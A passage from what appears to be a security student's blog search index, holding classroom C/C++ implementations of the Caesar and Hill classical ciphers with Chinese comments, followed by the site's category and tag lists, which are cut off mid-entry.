*fopen（文件名字符串，打开方式串）&quot;r&quot;或&quot;rt&quot;:正文文件只读方式打开 fgets(message,50,file1); //读入数据到message，指针指到file1，以执行打开file1的动作 printf(&quot;length of plaintext: %lu&quot;, strlen(message)); //定义为long unsigned类型，显示字符串的长度 lenthofmessage=strlen(message); //将上一步得到的message的长度赋值给int型的lenthofmessage strcpy(plaintext,message); //strcpy的用法，将str2的字符串复制到str1中。 将message复制到plaintext中 printf(&quot;\\nplaintext is:&quot;); for (i=0;i&lt;lenthofmessage;i++) printf(&quot;%c&quot;,plaintext[i]); //按message的长度，逐字输出 printf(&quot;\\nPlease input the key:&quot;); //输入凯撒密码的密钥 scanf(&quot;%d&quot;,&amp;key); i=0; while (i&lt;lenthofmessage) //逐位循环 &#123; if (plaintext[i]&gt;=&#x27;A&#x27;&amp;&amp;plaintext[i]&lt;=&#x27;Z&#x27;) //字母控制在A～Z ciphertext[i]=&#x27;A&#x27;+(plaintext[i]-&#x27;A&#x27;+key)%26; //加密：c=m+key(mod 26) else if (plaintext[i]&gt;=&#x27;a&#x27;&amp;&amp;plaintext[i]&lt;=&#x27;z&#x27;) ciphertext[i]=&#x27;a&#x27;+(plaintext[i]-&#x27;a&#x27;+key)%26;// else if (plaintext[i]==&#x27; &#x27;) ciphertext[i]=&#x27; &#x27;; else ciphertext[i]=plaintext[i]; i++; &#125; ciphertext[i]=&#x27;\\0&#x27;; printf(&quot;\\n&quot;); printf(&quot;ciphertext:&quot;); i=0; for (i=0;i&lt;=lenthofmessage;i++) printf(&quot;%c&quot;,ciphertext[i]); fclose(file1); getchar(); return 0;&#125; 8.2多表代换123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;memory.h&gt;#include &lt;cstdlib&gt;#include &lt;ctime&gt;#include &lt;cstdio&gt;#include &lt;cmath&gt;using namespace std;//定义一些常变量const int M = 26; //定义集合&#123;a,b,...,z&#125;的26个英文字母//行和列均为5const int ROW = 5;const int COL = 5;//定义5*5的加密矩阵int K[ROW][COL];//定义5*5的解密矩阵int D[ROW][COL];int P[ROW]; //明文单元int C[ROW]; //密文单元int F[ROW]; //密文解密后的单元//三元组gcd(a,b) = ax + by = dstruct GCD&#123; int x; int y; int d;&#125;;class Hill_Cipher&#123;public: //产生随机矩阵 void random_Matrix(); //求矩阵的行列式 int Det(int matrix[ROW][ROW],int row); //求两个数的最大公约数 int gcd(int a,int b); /* *判断矩阵K是否在模26的情况下可逆 *因为矩阵在模26的情形下存在可逆矩阵的充分必要条件是 *gcd(det K,26) = 1 */ bool Inverse(int matrix[ROW][ROW]); //矩阵相乘 void multiphy(int matrix[ROW][ROW],int p[ROW],int row); //求出伴随矩阵 void adjoint_matrix(int matrix[ROW][ROW],int row); //将明文加密为密文 string encryption(string plaintext); //将密文解密为明文(为了辨识清楚,我们统一以小写字母作为明文,大写字母作为密文) string deciphering(string ciphertext); //欧几里得算法求模的逆 GCD extended_Euclid(int a,int b); //模逆运算 int inverse(int a,int m); //由于C++不存在负数取模的内置函数,现在自己设定一个 //定义一个模M的值 int Mod(int a);&#125;;void Hill_Cipher::random_Matrix()&#123; int i,j; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; COL;j++) &#123; K[i][j] = rand() % 26; //产生一个5*5模26的矩阵 &#125; &#125; cout &lt;&lt; &quot;随机产生5*5的矩阵:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; COL;j++) &#123; printf(&quot;%2d &quot;,K[i][j]); &#125; cout &lt;&lt; endl; &#125;&#125;//求矩阵的行列式int Hill_Cipher::Det(int matrix[ROW][ROW],int row)&#123; int i,j; int cofa[ROW][ROW]; //用于存放余子阵 int l; //l为所递归的余子阵的行 int p = 0,q = 0; int sum=0; //由于行和列相同(方阵),所以行列式的值一定存在,故不需要判断是否为方阵 //递归基 if(row == 1) return matrix[0][0]; for(i = 0;i &lt; row; i++) &#123; for(l = 0;l &lt; row - 1;l++) &#123; if(l &lt; i) p=0; else p=1; for(j = 0;j&lt; row - 1;j++) &#123; cofa[l][j] = matrix[l + p][j + 1]; &#125; &#125; //相当于(-1)^i if(i % 2 == 0) q=1; else q=(-1); sum = sum + matrix[i][0] * q * Det(cofa,row - 1); &#125; return sum;&#125;//求两个数的最大公约数int Hill_Cipher::gcd(int a,int b)&#123; int temp; //交换两个数的大小,使得a为较大数 if(a &lt; b) &#123; temp = a; a = b; b = temp; &#125; while(a % b) &#123; temp = b; b = a % b; a = temp; &#125; return b;&#125;/* *判断矩阵K是否在模26的情况下可逆 *因为矩阵在模26的情形下存在可逆矩阵的充分必要条件是 *gcd(det K,26) = 1 */bool Hill_Cipher::Inverse(int matrix[ROW][ROW])&#123; if(gcd(Det(matrix,ROW),M) == 1) return true; else return false;&#125;void Hill_Cipher::multiphy(int matrix[ROW][ROW],int p[ROW],int row)&#123; int i,j; //先将密文单元清零 memset(C,0,sizeof(C)); for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; C[i] += P[j] * K[j][i]; &#125; &#125;&#125;//将明文加密为密文string Hill_Cipher::encryption(string plaintext)&#123; int i; string ciphertext; //将字符串转化为明文数组 for(i = 0;i &lt; ROW;i++) &#123; P[i] = plaintext[i] - &#x27;a&#x27;; &#125; multiphy(K,P,ROW); //将密文数组转化为密文 for(i = 0;i &lt; ROW;i++) //这里先将其模26,再翻译为对应的字母 &#123; C[i] =Mod(C[i]); ciphertext += C[i] + &#x27;A&#x27;; &#125; return ciphertext;&#125;//求出伴随矩阵void Hill_Cipher::adjoint_matrix(int matrix[ROW][ROW],int row)&#123; int i,j,k,l; int p,q; p = q = 0; int temp[ROW][ROW]; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; for(k = 0;k &lt; ROW - 1;k++) &#123; if(k &lt; i) p = 0; else p = 1; for(l = 0;l &lt; ROW - 1;l++) &#123; if(l &lt; j) q = 0; else q = 1; temp[k][l] = matrix[k+p][l+q]; &#125; &#125; D[j][i] = (int)pow(-1,(double)i+j)*Det(temp,ROW-1); D[j][i] = Mod(D[j][i]); &#125; &#125;&#125;//将密文解密为明文(为了辨识清楚,我们统一以小写字母作为明文,大写字母作为密文)string Hill_Cipher::deciphering(string ciphertext)&#123; //求出矩阵的逆 string text; int determinant = Det(K,ROW); int inver = inverse(determinant,26); adjoint_matrix(K,ROW); //伴随矩阵 cout &lt;&lt; &quot;行列式的值: &quot; &lt;&lt; determinant &lt;&lt; endl; int i,j; memset(F,0,sizeof(F)); for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; F[i] += C[j] * D[j][i]; &#125; F[i] *= inver; F[i] = Mod(F[i]); //算到的结果要模去26 &#125; for(i = 0;i &lt; ROW;i++) text += F[i] + &#x27;a&#x27;; return text;&#125;GCD Hill_Cipher::extended_Euclid(int a,int b)&#123; GCD aa,bb; if(b == 0) &#123; aa.x = 1; aa.y = 0; aa.d = a; return aa; &#125; else &#123; bb = extended_Euclid(b,a%b); aa.x = bb.y; aa.y = bb.x - (a / b) * bb.y; aa.d = bb.d; &#125; return aa;&#125;int Hill_Cipher::inverse(int a,int m)&#123; GCD aa; aa = extended_Euclid(a,m); return aa.x;&#125;int Hill_Cipher::Mod(int a)&#123; return a &gt;= 0 ? a % M : (M + a % M);&#125;int main()&#123; int i,j; Hill_Cipher hh; cout &lt;&lt; &quot;使用希尔密码进行消息的加解密:&quot; &lt;&lt; endl; //srand()函数产生一个以当前时间开始的随机种子.以保证每次产生的随机数矩阵都不相同 srand((unsigned)time(0)); hh.random_Matrix(); while(!hh.Inverse(K)) &#123; cout &lt;&lt; &quot;该矩阵模26不可逆,不可以作为密钥!&quot; &lt;&lt; endl; cout &lt;&lt; endl; hh.random_Matrix(); &#125; cout &lt;&lt; &quot;该矩阵模26可逆,因此可以作为密钥.&quot; &lt;&lt; endl; cout &lt;&lt; endl; //利用所选密钥，对给定的5元明文信息进行加解密 string plaintext,ciphertext; cout &lt;&lt; &quot;请输入5元明文信息，仅支持小写字母，无空格:&quot; &lt;&lt; endl; cin &gt;&gt; plaintext; ciphertext = hh.encryption(plaintext); cout &lt;&lt; endl; cout &lt;&lt; &quot;该明文通过希尔密码法加密过后,输出的密文消息以大写方式输出为:&quot; &lt;&lt; endl; cout &lt;&lt; ciphertext &lt;&lt; endl; cout &lt;&lt; endl; cout &lt;&lt; &quot;***输入0:退出 ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入1:查看明文空间对***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入2:查看密文空间对***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入3:查看密钥 ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入4:将消息解密 ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入5:查看菜单 ***&quot; &lt;&lt; endl; char c; while(cin &gt;&gt; c) &#123; if(c == &#x27;0&#x27;) &#123; cout &lt;&lt; endl; cout &lt;&lt; &quot;退出&quot; &lt;&lt; endl; break; &#125; else if(c == &#x27;1&#x27;) &#123; cout &lt;&lt; &quot;明文空间:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) cout &lt;&lt; P[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; cout &lt;&lt; endl; &#125; else if(c == &#x27;2&#x27;) &#123; cout &lt;&lt; &quot;密文空间:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) cout &lt;&lt; C[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; cout &lt;&lt; endl; &#125; else if(c == &#x27;3&#x27;) &#123; cout &lt;&lt; &quot;密钥:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; printf(&quot;%2d &quot;,K[i][j]); &#125; cout &lt;&lt; endl; &#125; cout &lt;&lt; endl; &#125; else if(c == &#x27;4&#x27;) &#123; hh.adjoint_matrix(K,ROW); string ss; ss = hh.deciphering(ciphertext); cout &lt;&lt; &quot;该密文解密过后,显示的原来的明文消息:&quot; &lt;&lt; endl; cout &lt;&lt; ss &lt;&lt; endl; cout &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;***输入0:退出 ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入1:查看明文空间对***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入2:查看密文空间对***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入3:查看密钥 ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入4:将消息解密 ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***输入5:查看菜单 ***&quot; &lt;&lt; endl; &#125; &#125; return 0;&#125;","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"密码学","slug":"实验/密码学","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"古典密码","slug":"古典密码","permalink":"https://gryffinbit.top/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"}],"categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"},{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"写 exp 遇到的问题","slug":"写-exp-遇到的问题","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"},{"name":"脆弱的本体","slug":"脆弱的本体","permalink":"https://gryffinbit.top/categories/%E8%84%86%E5%BC%B1%E7%9A%84%E6%9C%AC%E4%BD%93/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"},{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/categories/Golang/"},{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://gryffinbit.top/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"流量分析","slug":"Web安全/流量分析","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"文件包含","slug":"Web安全/文件包含","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"XSS","slug":"Web安全/XSS","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/XSS/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"内网渗透","slug":"渗透测试/内网渗透","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"文件上传","slug":"Web安全/文件上传","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"sql","slug":"Web安全/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"},{"name":"工具","slug":"渗透测试/工具","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"杂七杂八","slug":"入侵检测/杂七杂八","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"},{"name":"工具","slug":"入侵检测/工具","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E5%B7%A5%E5%85%B7/"},{"name":"suricata","slug":"入侵检测/suricata","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/suricata/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"},{"name":"iptables","slug":"入侵检测/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"},{"name":"攻防模拟","slug":"攻防模拟","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/"},{"name":"蓝队","slug":"攻防模拟/蓝队","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/%E8%93%9D%E9%98%9F/"},{"name":"蜜罐","slug":"入侵检测/蜜罐","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E8%9C%9C%E7%BD%90/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/categories/Linux/"},{"name":"实战记录","slug":"渗透测试/实战记录","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"},{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"专业英语","slug":"期末考试/专业英语","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/"},{"name":"信息安全工程","slug":"期末考试/信息安全工程","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B/"},{"name":"信息论与编码","slug":"期末考试/信息论与编码","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E8%AE%BA%E4%B8%8E%E7%BC%96%E7%A0%81/"},{"name":"网络攻防","slug":"期末考试/网络攻防","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"},{"name":"WEB应用开发","slug":"期末考试/WEB应用开发","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/WEB%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"},{"name":"无线网络安全","slug":"期末考试/无线网络安全","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"逆向","slug":"实验/逆向","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"物联网","slug":"期末考试/物联网","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%89%A9%E8%81%94%E7%BD%91/"},{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"物联网","slug":"实验/物联网","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%89%A9%E8%81%94%E7%BD%91/"},{"name":"write up","slug":"write-up","permalink":"https://gryffinbit.top/categories/write-up/"},{"name":"操作系统","slug":"期末考试/操作系统","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"可信计算","slug":"期末考试/可信计算","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97/"},{"name":"数据结构","slug":"期末考试/数据结构","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"网络安全技术","slug":"期末考试/网络安全技术","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"},{"name":"网络安全技术","slug":"实验/网络安全技术","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"},{"name":"入侵检测与取证","slug":"实验/入侵检测与取证","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%96%E8%AF%81/"},{"name":"网络编程","slug":"实验/网络编程","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"病毒原理","slug":"期末考试/病毒原理","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86/"},{"name":"密码学","slug":"实验/密码学","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"html","slug":"html","permalink":"https://gryffinbit.top/tags/html/"},{"name":"JS","slug":"JS","permalink":"https://gryffinbit.top/tags/JS/"},{"name":"semgrep","slug":"semgrep","permalink":"https://gryffinbit.top/tags/semgrep/"},{"name":"VUE","slug":"VUE","permalink":"https://gryffinbit.top/tags/VUE/"},{"name":"Tornado","slug":"Tornado","permalink":"https://gryffinbit.top/tags/Tornado/"},{"name":"远程开发","slug":"远程开发","permalink":"https://gryffinbit.top/tags/%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"},{"name":"Lylme Spage","slug":"Lylme-Spage","permalink":"https://gryffinbit.top/tags/Lylme-Spage/"},{"name":"文件上传","slug":"文件上传","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"XSS","slug":"XSS","permalink":"https://gryffinbit.top/tags/XSS/"},{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"},{"name":"hexo","slug":"hexo","permalink":"https://gryffinbit.top/tags/hexo/"},{"name":"wordpress","slug":"wordpress","permalink":"https://gryffinbit.top/tags/wordpress/"},{"name":"思路","slug":"思路","permalink":"https://gryffinbit.top/tags/%E6%80%9D%E8%B7%AF/"},{"name":"反弹 shell","slug":"反弹-shell","permalink":"https://gryffinbit.top/tags/%E5%8F%8D%E5%BC%B9-shell/"},{"name":"感想","slug":"感想","permalink":"https://gryffinbit.top/tags/%E6%84%9F%E6%83%B3/"},{"name":"深信服","slug":"深信服","permalink":"https://gryffinbit.top/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"},{"name":"PHP","slug":"PHP","permalink":"https://gryffinbit.top/tags/PHP/"},{"name":"xpcmdshell","slug":"xpcmdshell","permalink":"https://gryffinbit.top/tags/xpcmdshell/"},{"name":"URL","slug":"URL","permalink":"https://gryffinbit.top/tags/URL/"},{"name":"Goland","slug":"Goland","permalink":"https://gryffinbit.top/tags/Goland/"},{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/tags/Golang/"},{"name":"go","slug":"go","permalink":"https://gryffinbit.top/tags/go/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://gryffinbit.top/tags/Fastjson/"},{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bluecms","slug":"bluecms","permalink":"https://gryffinbit.top/tags/bluecms/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gryffinbit.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"macOS13","slug":"macOS13","permalink":"https://gryffinbit.top/tags/macOS13/"},{"name":"Godzilla","slug":"Godzilla","permalink":"https://gryffinbit.top/tags/Godzilla/"},{"name":"Spring","slug":"Spring","permalink":"https://gryffinbit.top/tags/Spring/"},{"name":"Shiro","slug":"Shiro","permalink":"https://gryffinbit.top/tags/Shiro/"},{"name":"mini_httpd","slug":"mini-httpd","permalink":"https://gryffinbit.top/tags/mini-httpd/"},{"name":"Jira","slug":"Jira","permalink":"https://gryffinbit.top/tags/Jira/"},{"name":"SSRF","slug":"SSRF","permalink":"https://gryffinbit.top/tags/SSRF/"},{"name":"weblogic","slug":"weblogic","permalink":"https://gryffinbit.top/tags/weblogic/"},{"name":"Zimbra","slug":"Zimbra","permalink":"https://gryffinbit.top/tags/Zimbra/"},{"name":"ZeroShell","slug":"ZeroShell","permalink":"https://gryffinbit.top/tags/ZeroShell/"},{"name":"struts2","slug":"struts2","permalink":"https://gryffinbit.top/tags/struts2/"},{"name":"struts","slug":"struts","permalink":"https://gryffinbit.top/tags/struts/"},{"name":"ognl","slug":"ognl","permalink":"https://gryffinbit.top/tags/ognl/"},{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"https://gryffinbit.top/tags/Cobalt-Strike/"},{"name":"CVE-2022-39197","slug":"CVE-2022-39197","permalink":"https://gryffinbit.top/tags/CVE-2022-39197/"},{"name":"文件包含","slug":"文件包含","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"M1","slug":"M1","permalink":"https://gryffinbit.top/tags/M1/"},{"name":"Arm","slug":"Arm","permalink":"https://gryffinbit.top/tags/Arm/"},{"name":"http隧道","slug":"http隧道","permalink":"https://gryffinbit.top/tags/http%E9%9A%A7%E9%81%93/"},{"name":"冰蝎4.0","slug":"冰蝎4-0","permalink":"https://gryffinbit.top/tags/%E5%86%B0%E8%9D%8E4-0/"},{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"},{"name":"log4j2","slug":"log4j2","permalink":"https://gryffinbit.top/tags/log4j2/"},{"name":"信息收集","slug":"信息收集","permalink":"https://gryffinbit.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Goby","slug":"Goby","permalink":"https://gryffinbit.top/tags/Goby/"},{"name":"nmap","slug":"nmap","permalink":"https://gryffinbit.top/tags/nmap/"},{"name":"svnhack","slug":"svnhack","permalink":"https://gryffinbit.top/tags/svnhack/"},{"name":"githack","slug":"githack","permalink":"https://gryffinbit.top/tags/githack/"},{"name":"目录扫描","slug":"目录扫描","permalink":"https://gryffinbit.top/tags/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/"},{"name":"so文件","slug":"so文件","permalink":"https://gryffinbit.top/tags/so%E6%96%87%E4%BB%B6/"},{"name":"钉钉API","slug":"钉钉API","permalink":"https://gryffinbit.top/tags/%E9%92%89%E9%92%89API/"},{"name":"机器人","slug":"机器人","permalink":"https://gryffinbit.top/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"},{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"},{"name":"java","slug":"java","permalink":"https://gryffinbit.top/tags/java/"},{"name":"python","slug":"python","permalink":"https://gryffinbit.top/tags/python/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"},{"name":"svn","slug":"svn","permalink":"https://gryffinbit.top/tags/svn/"},{"name":"scapy","slug":"scapy","permalink":"https://gryffinbit.top/tags/scapy/"},{"name":"tcpreplay","slug":"tcpreplay","permalink":"https://gryffinbit.top/tags/tcpreplay/"},{"name":"suiricata","slug":"suiricata","permalink":"https://gryffinbit.top/tags/suiricata/"},{"name":"ARM","slug":"ARM","permalink":"https://gryffinbit.top/tags/ARM/"},{"name":"Perl","slug":"Perl","permalink":"https://gryffinbit.top/tags/Perl/"},{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARM架构","slug":"ARM架构","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallels虚拟机","slug":"parallels虚拟机","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"guardian","slug":"guardian","permalink":"https://gryffinbit.top/tags/guardian/"},{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"},{"name":"SNAT","slug":"SNAT","permalink":"https://gryffinbit.top/tags/SNAT/"},{"name":"centOS-Stream","slug":"centOS-Stream","permalink":"https://gryffinbit.top/tags/centOS-Stream/"},{"name":"NIDS","slug":"NIDS","permalink":"https://gryffinbit.top/tags/NIDS/"},{"name":"DNAT","slug":"DNAT","permalink":"https://gryffinbit.top/tags/DNAT/"},{"name":"GitHub","slug":"GitHub","permalink":"https://gryffinbit.top/tags/GitHub/"},{"name":"snort规则","slug":"snort规则","permalink":"https://gryffinbit.top/tags/snort%E8%A